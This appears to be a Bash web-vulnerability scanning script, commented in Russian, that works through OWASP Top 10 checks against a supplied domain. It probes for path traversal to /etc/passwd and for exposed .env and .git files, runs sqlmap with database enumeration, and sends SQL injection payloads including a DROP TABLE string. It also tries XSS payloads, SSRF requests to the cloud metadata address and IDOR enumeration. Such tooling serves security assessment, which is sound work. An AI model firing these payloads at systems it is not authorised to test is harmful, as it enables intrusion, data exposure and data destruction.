#!/usr/bin/env bash
# Этап 3: Проверка веб-уязвимостей (OWASP Top 10)
set -euo pipefail

TARGET="${1:?Usage: $0 <domain>}"
BASE_URL="https://$TARGET"
OUT="scanning/${TARGET}/web_vulns"
mkdir -p "$OUT"

echo "[*] Проверка OWASP Top 10 для: $BASE_URL"

# =============================================
# A01 — Broken Access Control
# =============================================
echo "[+] A01: Broken Access Control..."

# IDOR / path traversal
for path in \
    "/../../../etc/passwd" \
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
    "/static/../../../etc/passwd" \
    "/admin/" "/admin/index.php" "/admin/login" \
    "/dashboard" "/panel" "/manager" "/administrator" \
    "/.git/" "/.git/config" "/.git/HEAD" \
    "/.env" "/.env.backup" "/.env.local" \
    "/backup/" "/backup.zip" "/backup.tar.gz" \
    "/wp-admin/" "/phpmyadmin/" "/adminer.php"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path")
    echo "$STATUS $BASE_URL$path" >> "$OUT/access_control.txt"
done

# =============================================
# A02 — Cryptographic Failures
# =============================================
echo "[+] A02: Cryptographic Failures..."

# HTTP → HTTPS редирект
HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -L "http://$TARGET")
echo "HTTP redirect check: $HTTP_CODE" > "$OUT/crypto.txt"

# Небезопасные заголовки
curl -sk -I "https://$TARGET" >> "$OUT/crypto.txt"

# HSTS
curl -sk -I "https://$TARGET" | grep -i "strict-transport" >> "$OUT/crypto.txt" || echo "HSTS: NOT SET" >> "$OUT/crypto.txt"

# Проверка слабых шифров
if command -v sslscan &>/dev/null; then
    sslscan --no-color "$TARGET:443" | grep -E "SSLv|TLSv|RC4|DES|EXPORT|NULL" >> "$OUT/crypto.txt" || true
fi

# =============================================
# A03 — SQL Injection
# =============================================
echo "[+] A03: SQL Injection (sqlmap)..."
if command -v sqlmap &>/dev/null; then
    # Краулинг форм с автоматической проверкой
    sqlmap -u "$BASE_URL" \
        --crawl=3 \
        --level=3 \
        --risk=2 \
        --batch \
        --forms \
        --dbs \
        --output-dir="$OUT/sqlmap" \
        --timeout=10 \
        --retries=2 2>&1 | tail -50 > "$OUT/sqlmap_summary.txt" || true
fi

# Ручные проверки базовых параметров
for PAYLOAD in "'" '"' "1 OR 1=1" "1' OR '1'='1" "'; DROP TABLE users--"; do
    # Если на сайте есть GET-параметры — тестируем их
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null || echo "$PAYLOAD")
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/?id=$ENCODED" 2>/dev/null)
    echo "SQLi test [$PAYLOAD]: $STATUS" >> "$OUT/sqli_manual.txt"
done

# =============================================
# A04 — Insecure Design / Sensitive Data
# =============================================
echo "[+] A04/A05: Чувствительные файлы..."
for path in \
    "/robots.txt" "/sitemap.xml" "/.htaccess" \
    "/web.config" "/wp-config.php" "/config.php" \
    "/config.yml" "/config.yaml" "/database.yml" \
    "/settings.py" "/local_settings.py" "/app/config/parameters.yml" \
    "/phpinfo.php" "/info.php" "/test.php" \
    "/server-status" "/server-info" \
    "/api/swagger.json" "/api/openapi.json" "/swagger-ui.html" \
    "/v1/api-docs" "/api/v1/" "/api/v2/" \
    "/.well-known/security.txt"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path")
    [ "$STATUS" != "404" ] && echo "$STATUS $BASE_URL$path" >> "$OUT/sensitive_files.txt"
done

# =============================================
# A06 — Vulnerable Components
# =============================================
echo "[+] A06: Определение версий компонентов..."
{
    curl -sk "$BASE_URL" | grep -oE '(jquery|bootstrap|angular|react|vue)[/@v.-]+[0-9]+\.[0-9]+\.[0-9]+' | sort -u
    curl -sk -I "$BASE_URL" | grep -iE '(server|x-powered-by|x-generator):'
} > "$OUT/components.txt" 2>&1 || true

# =============================================
# A07 — XSS
# =============================================
echo "[+] A07: XSS проверки..."
XSS_PAYLOADS=(
    '<script>alert(1)</script>'
    '"><script>alert(1)</script>'
    "';alert(1)//"
    '<img src=x onerror=alert(1)>'
    '<svg onload=alert(1)>'
)
for PAYLOAD in "${XSS_PAYLOADS[@]}"; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null || echo "$PAYLOAD")
    RESPONSE=$(curl -sk "$BASE_URL/?q=$ENCODED&search=$ENCODED" 2>/dev/null)
    if echo "$RESPONSE" | grep -qF "$PAYLOAD"; then
        echo "REFLECTED XSS FOUND: $PAYLOAD" >> "$OUT/xss.txt"
    else
        echo "safe: $PAYLOAD" >> "$OUT/xss.txt"
    fi
done

# =============================================
# A08 — Security Misconfiguration
# =============================================
echo "[+] A08: Security Headers..."
{
    echo "=== Security Headers Check ==="
    HEADERS=$(curl -sk -I "https://$TARGET")

    for header in \
        "Content-Security-Policy" \
        "X-Frame-Options" \
        "X-Content-Type-Options" \
        "Referrer-Policy" \
        "Permissions-Policy" \
        "Strict-Transport-Security"; do
        if echo "$HEADERS" | grep -qi "$header"; then
            echo "[OK] $header: $(echo "$HEADERS" | grep -i "$header" | head -1)"
        else
            echo "[MISSING] $header"
        fi
    done

    # CORS
    CORS=$(curl -sk -I -H "Origin: https://evil.com" "https://$TARGET" | grep -i "access-control")
    [ -n "$CORS" ] && echo "[!] CORS: $CORS" || echo "[OK] CORS: not exposed"

    # Cookie flags
    echo "=== Cookie Flags ==="
    curl -sk -c - "https://$TARGET" 2>&1 | grep -v '^#' | awk '{print $NF, $6, $7}' || true
} > "$OUT/security_headers.txt" 2>&1

# =============================================
# A09 — SSRF
# =============================================
echo "[+] A09: SSRF проверки..."
# Используем публичный SSRF-детектор (burp collaborator-style)
# В реальном тесте заменить на свой out-of-band сервер
for PARAM in "url" "redirect" "next" "return" "goto" "link" "src" "href" "img" "image" "load"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
        "$BASE_URL/?$PARAM=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
    echo "SSRF [$PARAM]: $STATUS" >> "$OUT/ssrf.txt"
done

# =============================================
# A10 — IDOR / API testing
# =============================================
echo "[+] A10: IDOR / API..."
for i in 1 2 3 100 9999; do
    for path in "/api/user/$i" "/api/users/$i" "/user/$i" "/order/$i" "/ticket/$i"; do
        STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path")
        [ "$STATUS" != "404" ] && echo "$STATUS $BASE_URL$path" >> "$OUT/idor.txt" || true
    done
done

echo "[*] Веб-уязвимости проверены → $OUT/"
